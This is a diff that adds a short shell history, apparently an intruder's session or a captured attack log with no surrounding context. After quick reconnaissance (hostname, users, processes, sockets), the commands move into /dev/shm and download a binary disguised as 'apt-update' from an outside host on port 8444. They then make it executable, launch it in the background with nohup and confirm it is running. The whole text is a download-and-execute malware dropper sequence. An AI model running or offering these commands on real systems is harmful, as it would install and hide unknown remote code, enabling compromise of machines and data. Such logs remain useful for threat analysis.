@@ -1,0 +1,13 @@
+hostname
+w
+ps auxfewwwwwwwwwwwwww
+ss -peanut
+ls -al /
+cd /dev/shm
+wget http://pannenkoekenpalazzo.nl:8444/foodtruck/apt-update
+ls
+chmod +x apt-update 
+file apt-update 
+(nohup ./apt-update &)
+ps auxwfewwwwwwwwwwww | grep apt-
+exit
